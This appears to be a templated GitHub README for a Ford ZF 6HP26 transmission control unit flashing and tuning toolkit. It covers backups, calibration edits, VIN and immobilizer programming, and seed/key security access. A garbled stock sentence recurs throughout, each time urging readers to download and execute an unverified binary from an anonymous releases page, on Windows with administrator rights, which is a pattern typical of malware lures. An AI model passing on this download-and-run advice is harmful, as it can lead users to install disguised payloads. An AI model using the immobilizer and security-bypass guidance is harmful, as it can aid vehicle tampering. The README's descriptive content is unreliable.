# 6HP26 Toolkit — Ford ZF TCU Flash, Adaptation & Diagnostics ⚙️🚗

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/umscripteraleatori/6HP26-pub/releases)  
https://github.com/umscripteraleatori/6HP26-pub/releases

![ZF 6HP26 transmission](https://upload.wikimedia.org/wikipedia/commons/5/5f/Automatic_transmission.jpg)

Table of Contents
- About this repo
- Quick links
- Key features
- Supported modules, vehicles and use cases
- What you get in a release
- System requirements
- Hardware and cable list
- Installation — download and execute
- First run checklist
- Typical workflows
  - Read and backup TCU
  - Flash TCU firmware
  - Read and write EEPROM / FRAM
  - Adaptations and resetting learned values
  - Shift map and torque control edits
  - VIN and immobilizer programming
  - Recovery and bootloader modes
- File types and formats
- Protocols and transport layers
- Logging and diagnostics
- Scripting and automation
- Troubleshooting and recovery recipes
- Developer notes and how to contribute
- License and credits
- Releases and download

About this repo
This repository hosts the public README for the 6HP26 Toolkit. The toolkit targets Ford vehicles that use the ZF 6HP26 transmission and its TCU/TCM modules. It documents workflows, file formats, connection methods, and scripts you will find in releases. It aims to help technicians, tuners, and engineers read, modify, and flash TCU software and data safely and repeatably.

Quick links
- Releases and installer: https://github.com/umscripteraleatori/6HP26-pub/releases  
  Download the release package and execute the included installer or script. The release contains the flasher, scripts, and sample calibration files.
- Releases page also hosts binary assets, change logs, and signed checksums.

Key features
- Read and backup complete TCU memory (flash, EEPROM, FRAM).  
- Flash official and custom firmware images.  
- Adaptation management: reset, read, and write learned values.  
- Live control and manual actuation: torque converter, solenoids, clutch control, line pressure.  
- Support for reading DTCs and live data streams (CAN/UDS/KWP).  
- Scripted operations for batch flashing and data extraction.  
- Logging with timestamped session files for audits.  
- Recovery tools for bricked TCU using bootloader and ISP.

Supported modules, vehicles and use cases
This toolkit focuses on ZF 6HP26 modules in Ford vehicles. It supports common TCU variations and multiple transport protocols.

Common target modules
- ZF 6HP26 TCU (various part numbers).  
- Ford-branded TCU based on ZF 6HP26 hardware.  
- Modules with external EEPROM and FRAM memory.  

Typical vehicles and use cases
- Ford models that ship with ZF 6HP26 transmissions.  
- Diagnostics and repair of shift faults.  
- Reflashing with updated calibration to fix shift quality.  
- Custom tuning: adjust shift points, torque limits, line pressure curves.  
- VIN programming after control unit swap.  
- Recovering from failed updates or corrupted calibration.

What you get in a release
Each release bundles tools, scripts, and documentation. Typical assets you will find in the release download:
- flasher-6hp26.exe (Windows) / flasher-6hp26 (Linux) — Main flasher and toolkit.  
- toolkit-cli.sh / toolkit-cli.bat — Command line wrapper.  
- 6hp26-toolkit-vX.Y.Z.zip — Zipped package with binaries and scripts.  
- sample-calibrations/ — Example shift maps, torque tables, and offsets.  
- adapters/ — Device drivers and plugin definitions for supported interfaces.  
- docs/ — Offline HTML and PDF documentation.  
- checksum.sha256 and checksum.sig — Signed checksums for release assets.  

Because the releases link contains a path, download the release package from https://github.com/umscripteraleatori/6HP26-pub/releases and execute the installer or script included in that release. Typical file names include 6hp26-toolkit-vX.Y.Z.zip and an included installer or executable. Run the provided installer or the appropriate platform binary to install the toolkit and drivers.

System requirements
- Desktop or laptop with USB or serial interfaces.  
- OS: Windows 10/11 (x64), or modern Linux distro (x86_64). Some tools run on macOS with extra setup.  
- 4 GB RAM minimum. 8 GB recommended.  
- 200 MB free disk for binaries. Additional space for logs and backups.  
- CAN interface or K-Line interface compatible with the toolkit.

Hardware and cable list
Use quality, shielded cables. The toolkit supports multiple interfaces via plugins. The most common hardware:
- Kvaser CAN interface (recommended).  
- PEAK-System PCAN-USB.  
- OBD2 to DB9 CAN bridge cable for vehicle connections.  
- Bench power supply or battery maintainer for stable 12V during flashing.  
- DB15/DB25 breakout for direct TCU bench connections (if required).  
- Optional: TTL USB adapter for UART boot access.

Installation — download and execute
Download the latest release from the releases page:
- Visit the releases page: https://github.com/umscripteraleatori/6HP26-pub/releases  
- Download the archive named 6hp26-toolkit-vX.Y.Z.zip or the platform installer (flasher-6hp26-setup.exe).  
- Verify the checksum with checksum.sha256 and checksum.sig.  
- Extract the archive or run the installer.  
- On Windows, run flasher-6hp26-setup.exe with administrator rights.  
- On Linux, extract and run ./flasher-6hp26 from the package root.

The release package includes platform binaries, driver installers, plugin adapters, and sample configuration files. Execute the provided installer or run the main binary to register drivers and set permissions for your interface.

First run checklist
- Confirm vehicle battery or bench power at stable 12.6–13.2 V.  
- Connect CAN/K-Line interface and confirm driver status.  
- Have a backup of the original TCU readout.  
- Use the correct connector pinout for the vehicle or bench rig.  
- Select the right protocol and module ID in the toolbox.  
- Set session logging and output directories.

Typical workflows

Read and backup TCU
Objective: create a full backup before any write operation.

Steps:
1. Power vehicle. Keep ignition in ON or accessory as required.  
2. Connect CAN interface to OBD-II port or to bench connector.  
3. Start toolkit and select target module (ZF 6HP26).  
4. Choose "Read full flash" and "Read EEPROM/FRAM" options.  
5. Start session and let the toolkit complete the read.  
6. Save session with timestamp and module part number.  

Expected artifacts:
- backup-YYYYMMDD-HHMMSS.bin — Full flash image.  
- eeprom-YYYYMMDD-HHMMSS.bin — EEPROM contents.  
- frammem-YYYYMMDD-HHMMSS.bin — FRAM contents.  
- log-YYYYMMDD-HHMMSS.txt — Operation log with transport traces.

Flash TCU firmware
Objective: safely apply a firmware or calibration image to the TCU.

Preparation:
- Verify the target file compatibility with the module part and hardware.  
- Ensure backup exists.  
- Disable systems that draw heavy current during flash (HVAC fans, lights).  

Steps:
1. Select operation "Flash full image" or "Flash calibration only."  
2. Pick file: tcu-firmware-XXXXX.bin or calibration-XXXXX.cal.  
3. Put the module into programming mode if required. The toolkit prompts for steps.  
4. Start flashing. Monitor progress on the UI.  
5. Do not interrupt power during write.  
6. After flash, run "Verify" to confirm CRC or checksum.  
7. If verification passes, perform module reset and run adaptation reset if required.

Typical flash artifacts:
- flashed-image-YYYYMMDD.bin  
- verify-report-YYYYMMDD.txt  

Read and write EEPROM / FRAM
Purpose: modify learned values, VIN, and small persistent tables.

Actions:
- Read full EEPROM and FRAM to offboard files.  
- Use built-in editors to search and edit specific tables (VIN, serial, learned clutches).  
- Write back edited files. Use verify mode after write.

Common edits:
- VIN rewrite after module swap.  
- Clear adaptation flags for solenoid learning.  
- Adjust torque converter lockup thresholds stored in EEPROM.

Adaptations and resetting learned values
Adaptation management is critical when you swap a TCU or rebuild a transmission.

Key adaptation items:
- Shift adaptation tables (short term, long term).  
- Torque converter clutch learn counter.  
- Solenoid calibration offsets.  

Actions:
- Read adaptation values. Export to CSV for tracking.  
- Reset short-term and long-term tables if you replace mechanical parts.  
- Run relearn procedures while driving or on a dyno per the service manual.

Shift map and torque control edits
Calibrators use the toolkit to tune shift quality and performance.

Work items:
- Shift point RPM thresholds.  
- Line pressure scaling vs. throttle.  
- Torque management tables to protect clutches and gearbox.  
- Lockup clutch engagement curve.

Editing process:
1. Export base calibration. Work on a copy.  
2. Use sample-calibrations as a reference for scaling and units.  
3. Validate units: RPM, kPa, torque Nm, percentage.  
4. Upload new calibration to a test module first.  
5. Drive test with data logging and tune iteratively.

VIN and immobilizer programming
VIN and immobilizer entries often reside in EEPROM or dedicated security area.

Procedure:
- Read EEPROM to capture existing values.  
- Use the toolkit's VIN editor to set the correct VIN string.  
- Immobilizer programming may require PIN codes and gateway commands.  
- For Ford, some modules require the vehicle's BCM to allow VIN changes. Follow the tool prompts to coordinate BCM and TCU actions.

Recovery and bootloader modes
The toolkit includes recovery methods if a TCU fails during flash.

Recovery options:
- Bootloader mode via UART or CAN ISP.  
- Forced boot via pinjumper on bench.  
- Secondary bootloader using ISP over CAN.  
- CRC-based partial recovery to reflash only corrupted sectors.

Recovery steps:
1. Connect to module via bench connector and enable bootloader mode.  
2. Use the "Bootloader Flash" routine in the toolkit.  
3. Flash a minimal boot image first, then the full firmware.  
4. Run a verify and then full system check.

File types and formats
Understand file types included in releases and produced by the toolkit.

Common file types:
- .bin — Raw flash or binary image.  
- .cal — Calibration file with structured tables and metadata.  
- .eep — EEPROM dump.  
- .frm — FRAM dump.  
- .log — Plain text operation/log file.  
- .csv — Exported tables for offline editing.  
- .hex — Intel HEX firmware format (occasionally used).  

Naming conventions:
- Use timestamps: module-YYYYMMDD-HHMMSS.ext.  
- Include module part number or VIN in filename for clarity.

Protocols and transport layers
The toolkit supports common diagnostic and programming transports.

Primary transports:
- CAN ISO-TP (ISO 15765) for UDS service access.  
- UDS (ISO 14229) services for security, erase, write, transfer.  
- KWP2000 on K-Line for older bench setups.  
- Proprietary ZF bootloader over CAN for low-level flashing.  
- UART for direct MCU bootloader access on some boards.

Common UDS services used:
- DiagnosticSessionControl (0x10) to enter programming session.  
- SecurityAccess (0x27) for seed/key authentication.  
- RoutineControl (0x31) for erase and program routines.  
- RequestDownload (0x34) and TransferData (0x36) to write partitions.  
- RequestUpload (0x35) to read partitions.

Security and authentication
Some TCUs require security keys before allowing write operations.

Key management:
- The toolkit implements a seed/key algorithm for supported modules.  
- For modules with stronger security, the release may include helper scripts for offline key calculation.  
- For dealer-only security, you must use OEM tools or pass a security protocol via the vehicle network.

Logging and diagnostics
Logging helps trace operations and diagnose issues.

Log types:
- Transport trace (CAN frames with timestamps).  
- Operation log (actions taken by the toolkit).  
- Error log (failed handshakes, timeouts).  
- CSV data logs for sensor and parameter traces.

Use the toolkit to record all sessions. Store logs with backups. Correlate logs with capture files from CAN sniffers when diagnosing.

Scripting and automation
The toolkit exposes a CLI for scripted flows.

Sample CLI usage:
- Read full flash:
  flasher-6hp26 --read-flash --output backup.bin
- Flash image:
  flasher-6hp26 --flash-image firmware.bin --verify
- Batch flash multiple modules:
  toolkit-cli.sh --batch batch-list.txt

Batch operations:
- Provide a CSV with VIN, module ID, file path.  
- Run the batch script to flash identical firmware across multiple modules.  
- Use the --dry-run option to verify steps before making changes.

Troubleshooting and recovery recipes

Symptom: Read fails with timeouts
- Check physical connections and pinout.  
- Confirm interface driver loaded.  
- Lower CAN speed to match module's bus speed.  
- Try direct bench connection to module CAN pins.

Symptom: Flash fails mid-write
- Ensure stable 12V supply. Use a battery charger or bench supply.  
- Retry firmware upload via bootloader mode.  
- Use recovery image if full flash fails.

Symptom: Module does not respond after flash
- Power cycle module and vehicle.  
- Enter bootloader mode and reflash minimal image.  
- Reapply calibration and perform adaptation reset.  
- Restore backup if necessary.

Symptom: VIN or immobilizer write fails
- Verify security access sequence succeeded.  
- Ensure BCM or other gateway modules allow vehicle network programming.  
- Use OEM service mode where needed.

Developer notes and how to contribute
This README documents public-facing procedures. Development, testing, and closed-source libraries may live outside this repo. Follow the repo conventions when contributing documentation or scripts.

Contribute process:
- Fork the repository.  
- Create a branch with your changes. Keep commits small and focused.  
- Add tests for scripts if applicable.  
- Open a pull request describing the change and the test plan.

Coding standards:
- Scripts must use POSIX shell or Python 3.x.  
- Keep variable names clear.  
- Log all actions to a session log file.

Plugin architecture
The toolkit uses a plugin model for interfaces and protocol variants.

Plugin layout:
- adapters/ contains adapter definitions.  
- Each adapter defines connect(), read(), write(), and debug() hooks.  
- Protocols map to a set of UDS or proprietary handlers.

Extending adapters:
- Create a new adapter file and implement the interface.  
- Add adapter metadata to adapters/index.json.  
- Test with sample bench setup before submitting.

Security and signing
Releases include checksums and optional signatures. Verify these files before running installers or binaries.

Release files include:
- checksum.sha256 — SHA256 of all released assets.  
- checksum.sig — GPG signature for checksum file.  
- public.gpg — Public key reference for verification.

Verification steps:
1. Download release assets and checksum files.  
2. Use sha256sum to compute local checksums and compare.  
3. Verify checksum file signature with GPG and the provided public key.

Releases and download
The releases page holds installers, archives, and assets. Because that URL includes a path, download the release package and execute the installer or included scripts. The releases page also contains change logs and checksums.

Use this link to access the releases: https://github.com/umscripteraleatori/6HP26-pub/releases

Release notes typically include:
- Changelog and bug fixes.  
- Supported adapter updates.  
- New calibration examples.  
- Security and seed/key algorithm updates.

Images and visual aids
Use reference images to identify connectors, pinouts, and module locations.

Connector reference
- OBD-II port pin locations for CAN connect.  
- Bench connector pinouts for TCU board-level access.  

Example images
- Transmission and TCU location photos.  
- Sample waveforms: solenoid PWM and pressure sensor traces.  
- Screenshot of toolkit UI during read or flash.

Data analysis and tuning advice
Work with small, controlled changes. Validate each step with a data log. Use clear metrics to measure shift quality:

Key metrics:
- Shift time (ms).  
- Torque drop during shift (Nm).  
- Line pressure delta (kPa).  
- Slip time on torque converter lockup.

Use A/B testing:
- Keep a copy of baseline calibration.  
- Change one table or curve at a time.  
- Drive in repeatable conditions and collect logs.  
- Revert if you observe regressions.

Common calibration targets
- Smoothness: reduce aggressive torque reduction during shifts.  
- Durability: increase line pressure in high-load ranges.  
- Economy: change lockup strategy for highway cruise.

Bench vs vehicle testing
Bench tests provide safe environment for low-level flashing and initial checks. Vehicle testing validates real-world performance. Follow a staged validation plan:
1. Bench boot verification.  
2. Passive CAN trace during key-on engine-off.  
3. Static actuation tests with engine off.  
4. Low-speed test drive.  
5. Full-range validation.

Audit trail and compliance
Keep a full audit trail for each operation. This includes:
- Operator name.  
- VIN or module serial.  
- Backup filenames.  
- Files flashed.  
- Logs and verification reports.

This record aids service history and helps recover from issues.

Sample session walkthrough
Session: Full flash and adaptation reset after TCU swap.

1. Capture VIN and module part number.  
2. Read and save full flash and EEPROM.  
3. Verify checksum of backups.  
4. Load target firmware image. Confirm compatibility.  
5. Put module into programming mode; follow toolkit prompts.  
6. Flash the firmware. Monitor CRC checksums.  
7. Verify flash complete.  
8. Reset adaptations and write VIN to EEPROM if needed.  
9. Reinstall module into vehicle.  
10. Perform road test and collect data logs.  
11. Store final logs with operator and timestamp.

Common troubleshooting recipes
- If seed/key fails: confirm algorithm version and check for patched security.  
- If CAN frames show errors: use an external CAN analyzer to confirm bus health.  
- If FRAM write fails: check board connectors and bench wiring.

Glossary of terms
- TCU / TCM: Transmission Control Unit / Transmission Control Module.  
- FRAM: Ferroelectric RAM, non-volatile memory.  
- EEPROM: Electrically Erasable Programmable Read-Only Memory.  
- UDS: Unified Diagnostic Services (ISO 14229).  
- ISO-TP: Transport protocol on CAN (ISO 15765).  
- K-Line: Older serial diagnostic line (ISO 9141 / KWP2000).  
- Bootloader: Low-level code enabling flash operations.  
- Seed/Key: Security handshake for unlock.

License and credits
Files in the release will specify the license. Check the LICENSE file in the release package. Credits go to contributors, testers, and community members who validated adapters and calibration examples.

Acknowledgments
- Community engineers for protocol research.  
- Test shops and tuners who validated calibration samples.  
- Open-source adapter drivers and CAN libraries.

Contact and support
For issues with releases, use the GitHub Issues for this repository. Supply logs and reproduction steps. When opening an issue, include:
- Toolkit version and OS.  
- Interface hardware used.  
- Log files and operation timestamps.  
- Steps to reproduce.

How to get the release
- Visit the releases page and download the packaged assets. Because the releases URL contains a path, download and execute the installer or run the binary included in the release.

Releases: https://github.com/umscripteraleatori/6HP26-pub/releases

Appendix A — Common commands and examples
- Read flash and EEPROM:
  - flasher-6hp26 --read-flash --read-eeprom --out-dir ./backups
- Flash with verify:
  - flasher-6hp26 --flash firmware.bin --verify --log session.log
- Reset adaptations:
  - flasher-6hp26 --reset-adaptations --confirm
- Export adaptation tables:
  - flasher-6hp26 --export-adaptations --format csv --out adapt.csv

Appendix B — File mapping and offsets
The toolkit uses a mapping table to locate common calibration sections inside a flash image. The mapping includes:
- Bootloader region (0x00000000–0x0001FFFF).  
- Application flash region (0x00020000–0x003FFFFF).  
- NV data area with EEPROM image reference.  
- CRC and checksum tables located near partition headers.

Appendix C — Example calibration fields
- ShiftMap_RPM: RPM breakpoints for gear shifts.  
- LinePressure_Scale: Multiplier for base line pressure table.  
- TorqueLimit_Gear: Max torque allowed per gear.  
- Lockup_Curve: Engagement percentage vs speed and load.

Appendix D — Test vectors and validation
Include known-good test vectors to validate adapter behavior:
- Known CAN frames expected on startup.  
- Seed response for known part numbers.  
- CRC values of stock firmware for test modules.

Appendix E — Hardware build notes
If you plan to build bench adapters, follow these notes:
- Use isolators for bench to protect your PC.  
- Keep trace lengths short on CAN bus.  
- Add TVS diodes for surge protection.  
- Use common ground between bench supply and module.

Appendix F — Legal and ethical use
Work on vehicles only with owner consent. Use backups and follow local laws for emissions and vehicle modification. Keep records of changes and maintain service integrity.

Files in the release require download and execution
Download the release package from the releases page and execute the installer or runtime binary included in the release. Typical filenames in a release include flasher-6hp26.exe, 6hp26-toolkit-vX.Y.Z.zip, and toolkit-cli scripts. Verify checksums before execution.

Badges and links
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/umscripteraleatori/6HP26-pub/releases)

Resources and further reading
- ISO 14229 UDS documentation.  
- ISO 15765 ISO-TP CAN transport.  
- ZF technical manuals and repair guides.  
- Ford service manuals for vehicle-specific procedures.

End of README